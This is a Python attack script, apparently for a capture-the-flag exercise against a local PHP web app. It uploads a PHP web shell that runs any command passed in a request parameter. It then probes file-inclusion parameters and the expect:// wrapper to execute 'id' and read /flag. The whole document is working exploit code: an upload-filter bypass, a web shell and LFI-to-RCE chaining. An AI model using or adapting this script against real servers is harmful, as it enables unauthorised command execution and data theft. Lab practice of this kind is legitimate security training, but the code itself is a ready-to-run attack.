import requests
import base64

base_url = "http://127.0.0.1:32824"

print("Uploading pure PHP shell to bypass image limitation...")
print("=" * 60)

# Upload a pure PHP shell without image headers
shell_php = b"""<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
    die;
}
?>FLAG{test_execution}"""

files = {'userfile': ('shell_pure.php', shell_php, 'application/x-php')}
data = {'submit': 'Upload Image'}
resp = requests.post(f"{base_url}/index.php", files=files, data=data)
print(f"Upload status: {resp.status_code}")
print(f"Response: {resp.text[:1000]}")

# Now try to include it via LFI
if 'upload/' in resp.text:
    print("\n[UPLOAD SUCCESSFUL] Testing LFI inclusion...")
    
    # Try different parameters
    param_list = ['file', 'include', 'page', 'img', 'view']
    
    for param in param_list:
        print(f"\nTesting {param}=...")
        
        # Test including the uploaded PHP shell
        test_url = f"{base_url}/index.php?{param}=upload/shell_pure.php&cmd=id"
        resp_test = requests.get(test_url)
        print(f"  URL: {test_url}")
        print(f"  Status: {resp_test.status_code}")
        print(f"  Length: {len(resp_test.content)}")
        
        if 'uid=' in resp_test.text:
            print(f"  [RCE SUCCESS] Command executed!")
            print(f"  Output: {resp_test.text}")
            
            # Try to get flag
            flag_url = f"{base_url}/index.php?{param}=upload/shell_pure.php&cmd=cat%20/flag"
            flag_resp = requests.get(flag_url)
            if 'FLAG{' in flag_resp.text:
                print(f"  [!] FLAG: {flag_resp.text}")
                break
        elif 'FLAG{' in resp_test.text:
            print(f"  [!] FLAG found in response: {resp_test.text}")
            break
        else:
            print(f"  Response preview: {resp_test.text[:500]}")

# Also try expect:// wrapper directly
print("\n" + "=" * 60)
print("Testing expect:// wrapper with direct command...")

for param in param_list:
    print(f"\nTesting {param}=expect://cat%20/flag")
    cmd_url = f"{base_url}/index.php?{param}=expect://cat%20/flag"
    resp_cmd = requests.get(cmd_url, timeout=10)
    print(f"Status: {resp_cmd.status_code}")
    print(f"Length: {len(resp_cmd.content)}")
    print(f"Response: {repr(resp_cmd.text[:1000])}")
    
    if 'FLAG{' in resp_cmd.text:
        print(f"[!] FLAG FOUND: {resp_cmd.text}")
        break

print("\n" + "=" * 60)
print("Testing complete.")
